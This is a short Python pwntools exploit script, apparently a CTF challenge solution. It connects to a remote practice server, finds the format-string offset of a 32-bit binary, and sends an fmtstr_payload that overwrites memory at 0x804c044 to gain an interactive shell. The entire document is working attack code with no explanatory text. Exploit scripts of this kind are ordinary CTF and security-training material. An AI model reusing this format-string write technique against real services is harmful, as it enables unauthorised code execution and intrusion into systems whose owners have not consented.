from pwn import * 
from pwn import p32


debug = 0
gdb_is = 0
context(arch='i386',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect('node4.buuoj.cn',25206)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x80492bc')
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')

# r.sendlineafter()

def exec_fmt(pad):
	p = process("./pwn")
	# send 还是 sendline以程序为准
	p.send(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
print("offset ===> ", fmt.offset)
 
payload = fmtstr_payload(fmt.offset,{0x804c044:1})
r.sendafter(b'your name:', payload)
r.interactive()